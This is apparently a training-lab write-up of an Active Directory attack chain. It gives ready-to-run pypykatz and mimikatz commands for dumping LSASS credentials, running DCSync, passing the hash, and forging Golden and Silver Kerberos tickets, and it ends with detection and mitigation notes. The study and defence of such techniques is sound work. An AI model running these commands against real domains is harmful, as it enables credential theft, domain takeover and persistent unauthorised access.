# LSASS Dump → Credential Extraction → DCSync → Ticket Forging

**MITRE ATT&CK:** T1003.001 (LSASS Memory), T1003.006 (DCSync), T1550.002 (Pass-the-Hash), T1558.001 (Golden Ticket), T1558.002 (Silver Ticket)

## Chain Overview

```
Initial Access
      ↓
Credential Access (LSASS)
      ↓
Credential Extraction
      ↓
Privilege Escalation
      ↓
Active Directory Replication Abuse (DCSync)
      ↓
Lateral Movement
      ↓
Persistence (Golden/Silver Ticket)
```

## 1. Create an LSASS Dump

**Purpose:** capture LSASS memory to analyze credentials offline.

Via Task Manager (requires local admin):

```
Task Manager → Details → lsass.exe → Right-click → Create Dump File
```

Output:

```
C:\Users\<User>\AppData\Local\Temp\lsass.DMP
```

## 2. Analyze the LSASS Dump

```powershell
pypykatz lsa minidump lsass.dmp -p kerberos   # extract Kerberos creds
pypykatz lsa minidump lsass.dmp -p wdigest    # extract WDigest creds
pypykatz lsa minidump lsass.dmp --json -o credentials.json
```

## 3. DCSync

**Purpose:** abuse AD replication rights to pull password data directly from
the DC, as if this host were a domain controller requesting a sync. Requires
an account with `Replicating Directory Changes` / `Replicating Directory
Changes All` rights (normally Domain Admins / Domain Controllers).

```cmd
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:<DOMAIN> /all /csv" exit
```

Dump all domain credentials.

```cmd
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:<DOMAIN> /user:<ADMIN_USER>" exit
```

Retrieve a single high-value account (e.g. built-in Administrator) —
lower-noise than a full-domain pull.

## 4. Pass-the-Hash

**Purpose:** authenticate using a captured NTLM hash instead of a password.

```cmd
mimikatz.exe "sekurlsa::pth /user:<ADMIN_USER> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:cmd.exe" exit
```

Launches a new command prompt running as the target user.

## 5. Golden Ticket

**Purpose:** forge a Kerberos TGT using the domain's `krbtgt` hash —
grants ticket-based access to *anything* in the domain, and survives
individual account password resets.

```cmd
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<SID> /krbtgt:<KRBTGT_HASH> /user:<ADMIN_USER> /id:500 /groups:512,513,518,519,520 /ptt" exit
```

```cmd
mimikatz.exe "kerberos::list" exit
```

List currently loaded Kerberos tickets in the session.

## 6. Silver Ticket

**Purpose:** forge a service ticket scoped to a *specific* service, using
that service account's hash rather than krbtgt — quieter than a Golden
Ticket since it never touches the KDC.

Example (CIFS service on a target host):

```cmd
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<SID> /target:<TARGET_HOST> /service:cifs /rc4:<SERVICE_HASH> /user:<ADMIN_USER> /id:500 /ptt" exit
```

## Context: How the SPN Got There

For reference, the SPN abused in the [Kerberoasting](04-kerberoasting.md)
stage of this lab was registered like so (illustrating what an admin action
looks like on the defender side, and what to look for when auditing SPNs):

```
setspn -a <DC_HOSTNAME>/<SVC_ACCOUNT>.<DOMAIN>:<PORT> <DOMAIN>\<SVC_ACCOUNT>
```

## Key Notes

- **Golden Tickets are persistence, not just access** — as long as
  `krbtgt`'s password isn't rotated (twice, to invalidate both current and
  previous hash), a forged TGT remains valid regardless of subsequent
  password changes on the impersonated account.
- **Silver Tickets don't touch the DC at all** during use, since the target
  service validates the ticket locally using its own key — this makes them
  harder to detect via DC-side Kerberos logging, but limits scope to the one
  service/host they were forged for.
- DCSync doesn't require code execution on the DC itself — only network
  reachability plus an account holding replication rights, which is what
  makes it such a high-value target for detection.

## Detection & Defensive Notes

- **DCSync:** Event ID 4662 on the DC with the
  `Replicating Directory Changes` / `Replicating Directory Changes All`
  extended rights GUIDs, from a source that isn't a legitimate DC — flag
  immediately.
- **LSASS access:** Sysmon Event ID 10 (ProcessAccess) targeting
  `lsass.exe`; enable **Credential Guard** to isolate secrets from
  userland-readable memory entirely.
- **Golden Ticket:** anomalously long-lived TGTs, TGTs for disabled/deleted
  accounts, or tickets with encryption types inconsistent with domain policy.
  Rotating `krbtgt` password twice invalidates all outstanding forged TGTs.
- **Silver Ticket:** monitor Event ID 4624/4634 on the *target service host*
  for logons with no matching TGT request on the DC — a ticket that never
  touched Kerberos infrastructure is the tell.
- Limit membership of groups with replication rights strictly to actual
  Domain Controllers and break-glass admin accounts.

---

*Performed against an isolated, self-owned lab domain for training purposes only.*
